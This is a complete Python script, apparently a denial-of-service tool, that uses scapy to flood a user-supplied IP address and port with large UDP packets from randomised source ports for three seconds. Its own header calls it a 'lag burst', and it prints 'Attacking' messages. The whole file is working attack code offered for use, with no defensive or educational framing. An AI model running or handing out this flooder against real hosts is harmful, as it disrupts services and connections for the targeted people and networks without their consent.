# raw_udp_flood.py — Direct 3-second lag burst to specific IP:PORT
import random
import time
import sys
from scapy.all import IP, UDP, Raw, send

# === CONFIGURATION ===
DURATION = 3  # seconds
PAYLOAD = b"X" * 1400

# === FLOOD ===
def raw_udp_flood(target_ip, target_port):
    print(f"[+] Attacking {target_ip}:{target_port} for {DURATION} seconds...")
    end_time = time.time() + DURATION
    while time.time() < end_time:
        try:
            pkt = IP(dst=target_ip) / UDP(sport=random.randint(1024, 65535), dport=int(target_port)) / Raw(load=PAYLOAD)
            send(pkt, verbose=0)
        except Exception as e:
            print(f"[!] Error: {e}")
    print("[+] Flood complete.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 raw_udp_flood.py <target_ip> <target_port>")
        sys.exit(1)
    raw_udp_flood(sys.argv[1], sys.argv[2])
